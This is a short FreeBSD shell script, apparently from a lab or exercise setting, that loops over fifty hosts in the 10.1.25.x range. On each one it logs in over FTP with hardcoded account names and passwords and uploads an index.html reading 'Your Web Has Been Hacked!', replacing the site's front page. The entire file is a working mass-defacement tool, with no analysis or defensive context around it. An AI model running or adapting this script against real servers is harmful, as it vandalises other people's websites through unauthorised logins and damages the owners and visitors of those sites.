#!/bin/sh
# Tested in FreeBSD

sudo sysctl net.inet.tcp.keepinit=1000

# for i in `jot - 99 100`
for i in `jot - 1 50`
do
ip=10.1.25.$i
# echo "$ip `date +%H:%M:%S`" > "$ip `date  +%H%M%S`".html
echo "<body style='background-color:black'><marquee><h1 style='color:red'>Your Web Has Been Hacked!</h1></marquee><marquee><h2 style='color:red'>$ip:1080 `date +%H%M%S`</h2></marquee></body>" > index.html
ftp -a $ip 1021<< EOF
user 11ecg5-1 123
put *.html
quit
EOF
rm *.html

sleep 1

# echo "$ip `date +%H:%M:%S`" > "$ip `date  +%H%M%S`".html
echo "<body style='background-color:black'><marquee><h1 style='color:red'>Your Web Has Been Hacked!</h1></marquee><marquee><h2 style='color:red'>$ip:2080 `date +%H%M%S`</h2></marquee></body>" > index.html
ftp -a $ip 1021<< EOG
user 11ecg5-2 321
put *.html
quit
EOG
rm *.html
done

sudo sysctl net.inet.tcp.keepinit=75000
